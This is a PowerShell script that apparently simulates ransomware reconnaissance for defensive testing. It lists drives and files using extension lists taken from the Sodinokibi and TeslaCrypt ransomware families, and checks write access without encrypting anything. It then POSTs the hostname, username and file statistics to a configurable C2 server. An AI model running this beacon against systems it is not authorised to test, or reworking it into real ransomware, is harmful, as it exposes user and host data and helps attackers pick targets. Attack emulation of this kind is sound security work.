# Global Variables
$NetworkDrives=@()
$LocalDrives=@()
$files=@()
$AffectedFiles=@()
$C2Server = '127.0.0.1' # ChangeMe
$C2Port = '1337' # ChangeMe
$C2Schema = 'http://' # ChangeMe
$C2Payload = ""


# Sophistication Emulation Range (1-3)
# 1 = Basic: Recursively Enumerates Down Local Drives and Mapped Drives exactly as they are mapped
# 2 = Intermediate: Basic + Enumerates Network Locations/Shortcuts + Attempts to walk up/down network locations - NOT YET IMPLEMENTED
# 3 = Sophisticated: Intermediate + Scans local network for SMB Shares to enumerate starting at root nodes - NOT YET IMPLEMENTED
$SophisticationLevel = 1


# Enumeration Filter Criteria
# Blacklist = Search all files excepte those filters in the blacklist
# Whitelist = Only search files matchines filters in the whitelist
$EnumerationFilter = "Whitelist"


# Blacklist derived from sodinokibi ransomware
$Blacklist = @("*.msstyles", "*.icl", "*.idx", "*.rtp", "*.sys", "*.nomedia", "*.dll", "*.hta", "*.cur", "*.lock", "*.cpl", "*.ics", "*.hlp", "*.com", "*.spl", "*.msi", "*.key", "*.mpa", "*.rom", "*.drv", "*.bat", "*.386", "*.adv", "*.diagcab", "*.mod", "*.scr", "*.theme", "*.ocx", "*.prf", "*.cab", "*.diagcfg", "*.msu", "*.cmd", "*.ico", "*.msc", "*.ani", "*.icns", "*.diagpkg", "*.deskthemepack", "*.wpx", "*.msp", "*.bin", "*.themepack", "*.shs", "*.nls", "*.exe", "*.lnk", "*.ps1", "*.ldf", "ntuser.dat", "desktop.ini", "thumbs.db", "iconcache.db", "ntuser.ini", "ntldr", "bootfont.bin", "ntuser.dat.log", "bootsect.bak", "boot.ini", "autorun.inf")

# Whitelist derived from teslacrypt and then added additional common extensions
$Whitelist = @("*.pdb", "*.dat", "*.json", "*.7z", "*.zip", "*.map", "*.m2", "*.rb", "*.jpg", "*.rar", "*.wmo", "*.mcmeta", "*.png", "*.cdr", "*.m4a", "*.itm", "*.vfs0", "*.jpeg", "*.indd", "*.wma", "*.sb", "*.mpqge", "*.txt", "*.ai", "*.avi", "*.fos", "*.kdb", "*.p7c", "*.eps", "*.wmv", "*.mcgame", "*.db0", "*.p7b", "*.pdf", "*.csv", "*.vdf", "*.DayZProfile", "*.p12", "*.pdd", "*.d3dbsp", "*.ztmp", "*.rofl", "*.pfx", "*.psd", "*.sc2save", "*.sis", "*.hkx", "*.pem", "*.dbfv", "*.sie", "*.sid", "*.bar", "*.crt", "*.mdf", "*.sum", "*.ncf", "*.upk", "*.cer", "*.wb2", "*.ibank", "*.menu", "*.das", "*.der", "*.rtf", "*.t13", "*.layout", "*.iwi", "*.x3f", "*.wpd", "*.t12", "*.dmp", "*.litemod", "*.srw", "*.dxg", "*.qdf", "*.blob", "*.asset", "*.pef", "*.xf", "*.gdb", "*.esm", "*.forge", "*.ptx", "*.dwg", "*.tax", "*.001", "*.ltx", "*.r3d", "*.pst", "*.pkpass", "*.vtf", "*.bsa", "*.rw2", "*.accdb", "*.bc6", "*.dazip", "*.apk", "*.rwl", "*.mdb", "*.bc7", "*.fpk", "*.re4", "*.raw", "*.pptm", "*.bkp", "*.mlx", "*.sav", "*.raf", "*.pptx", "*.qic", "*.kf", "*.lbf", "*.orf", "*.ppt", "*.bkf", "*.iwd", "*.slm", "*.nrw", "*.xlk", "*.sidn", "*.vpk", "*.bik", "*.mrwref", "*.xlsb", "*.sidd", "*.tor", "*.epk", "*.mef", "*.xlsm", "*.mddata", "*.psk", "*.rgss3a", "*.erf", "*.xlsx", "*.itl", "*.rim", "*.pak", "*.kdc", "*.xls", "*.itdb", "*.w3x", "*.big", "*.dcr", "*.wps", "*.icxs", "*.fsh", "*.unity3d", "*.cr2", "*.docm", "*.hvpl", "*.ntl", "*.wotreplay", "*.crw", "*.docx", "*.hplg", "*.arch00", "*.xxx", "*.bay", "*.doc", "*.hkdb", "*.lvl", "*.desc", "*.sr2", "*.odb", "*.mdbackup", "*.snx", "*.py", "*.srf", "*.odc", "*.syncdb", "*.cfr", "*.m3u", "*.arw", "*.odm", "*.gho", "*.ff", "*.flv", "*.3fr", "*.odp", "*.cas", "*.vpp_pc", "*.js", "*.dng", "*.ods", "*.svg", "*.lrf", "*.css", "*.jpe", "*.odt", "*.pps", "*.xlr", "*.java", "*.h", "*.sh", "*.vbs", "*.py", "*.swift", "*.ps1", "*.crt", "*.cer", "*.key", "*.bak", "*.bkup", "*.tex", "*.wks", "*.m4v", "*.kbds", "*.mpeg", "*.mpg", "*.mov", "*.php", "*.asp", "*.aspx", "*.pl", "*.js", "*.jsp", "*.xhtml", "*.bmp", "*.gif", "*ico", "*.svg", "*.jar", "*.sql", "*.tar", "*.xml", "*.mp3", "*.wav", "*.ogg")

# Build String to be sent as C2 Payload, essentially just console output
$C2Payload += ("Simulating Ransomware Infection Routine!`n")
$C2Payload +=  ("Sophistication Level: " + $SophisticationLevel + "`n")
$C2Payload +=  ("Enumeration Filter Criteria: " + $EnumerationFilter + "`n")
$C2Payload +=  ("Hostname: " + $env:COMPUTERNAME + "`n")
$C2Payload +=  ("Current User: " + $env:USERDOMAIN + '\' + $env:USERNAME + "`n")
Write-Host $C2Payload


# Attempt to reach the C2 Server
Try {
    $C2Status = Invoke-WebRequest -uri ($C2Schema + $C2Server + ":" + $C2Port + "/Status") -Method GET
    Continue
} Catch {
    Write-Warning "C2 Server is not reachable"
    Exit(1)
}

# Enumerate Local Drives
$PSDrives = Get-PSDrive -PSProvider FileSystem | Select-Object -Property Root, DisplayRoot


# Find Network Drives
$NetworkDrives += ($PSDrives | Where-Object {$_.DisplayRoot -ne $null}).DisplayRoot


# Find Local Drives
$LocalDrives += ($PSDrives | Where-Object {$_.DisplayRoot -eq $null}).Root


# If Basic Ransomware
if ($SophisticationLevel -eq 1) {
    $EnumerateTargets = $NetworkDrives += $LocalDrives
    $EnumerateTargets = $EnumerateTargets | Sort-Object -Unique
}


# If Intermediate Ransomware
if ($SophisticationLevel -eq 2) {
    # Enumerate Quick Access Network Shortcuts
    $objSh = New-Object -ComObject shell.application
    $QuickAccess = $objSh.Namespace("shell:::{679f85cb-0220-4080-b29b-5540cc05aab6}").Items() | Select-Object Path
    foreach ($path in $QuickAccess) {
    
        Try {
            $RootPath = @(get-item $path.Path).Root.FullName
            if ($RootPath -match '\\\\') {$NetworkDrives+=$RootPath}
        } Catch {
            Write-Verbose "Unable To Access Path"
        }
    }

    $EnumerateTargets = $NetworkDrives += $LocalDrives
    $EnumerateTargets = $EnumerateTargets | Sort-Object -Unique

}

# Loop Through Drives
foreach ($target in $EnumerateTargets) {
   Write-Host ("Enumerating " + $target)
   $C2Payload += ("Enumerating " + $target + "`n")

   # Enumerate Files using Filter Style Blacklist or Whitelist
   if ($EnumerationFilter -eq 'Blacklist'){
        $files += Get-ChildItem -Path $target -Recurse -Filter "*.*" -Force -File -Exclude $Blacklist -ErrorAction SilentlyContinue
   } else {
        $files += Get-ChildItem -Path $target -Recurse -Filter "*.*" -Force -File -Include $Whitelist -ErrorAction SilentlyContinue
   }

   # Attempt to clean up garbage? Make it faster??
   [GC]::Collect()
}


# Loop through Discovered Files
foreach ($file in $files) {

    # Check For Write Access
    Try{
        
        [System.IO.File]::OpenWrite($file).close() # <----- Check does not affect metadata (last access,modifed,created timestamps) of file
        $AffectedFiles += $file

    } Catch{
        Write-Verbose ("No Write Permission on: " + $file)
    }

}


# Count of Files
$C2Payload += ("Total Files Encrypted: " + ('{0:N0}' -f $AffectedFiles.Count) + "`n")
Write-Host ("Total Files Encrypted: " + ('{0:N0}' -f $AffectedFiles.Count))


# Sum of Data Size of all Files
$TotalData = ($AffectedFiles | Measure-Object -Sum Length).Sum
if ($TotalData -gt 1GB) {
    Write-Host ("Total Data Encrypted (GB): " + [System.Math]::Round(($TotalData / 1GB), 2) + "`n")
    $C2Payload += ("Total Data Encrypted (GB): " + [System.Math]::Round(($TotalData / 1GB), 2) + "`n")
} else {
    Write-Host ("Total Data Encrypted (MB): " + [System.Math]::Round(($TotalData / 1MB), 2) + "`n")
    $C2Payload += ("Total Data Encrypted (MB): " + [System.Math]::Round(($TotalData / 1MB), 2) + "`n")
}

# Top File Types by Extension
$TopTenFileTypes = $AffectedFiles | Group-Object -Property Extension -NoElement | Sort-Object -Property Count -Descending | Select-Object -First 10
Write-host ($TopTenFileTypes | Out-String)
$C2Payload += ($TopTenFileTypes | Out-String)


# Post Output Report to C2 Server
Invoke-WebRequest -Uri ($C2Schema + $C2Server + ":" + $C2Port + "/receive") -Method POST -Body $C2Payload

# Done
